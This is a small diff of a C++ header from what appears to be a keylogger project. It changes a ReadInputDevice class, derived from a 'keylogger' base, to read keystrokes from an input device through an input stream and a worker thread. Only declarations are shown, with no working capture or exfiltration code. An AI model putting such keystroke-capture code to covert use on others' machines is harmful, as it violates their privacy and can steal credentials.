@@ -22,20 +22,23 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 */
 #include <fstream>
+
+#include <thread>
 #include "keylogger.h"
 class ReadInputDevice: public keylogger
 {
 	public:
-		ReadInputDevice(std::string device, std::condition_variable* cond);
+		ReadInputDevice(std::string device);
 		~ReadInputDevice() 
 		{
-			ofs.close();
+			ifs.close();
 		}
-		void main(void);
+		void kbdListener(void);
 		bool ifkeyStrokeAvailable(void);
 		int  getKeyStroke(void);
 
 	private:
-		std::ofstream ofs;
+		std::ifstream ifs;
+		std::thread worker;
 		int InputSystemKbdGetDevice(std::string& dev);
 };
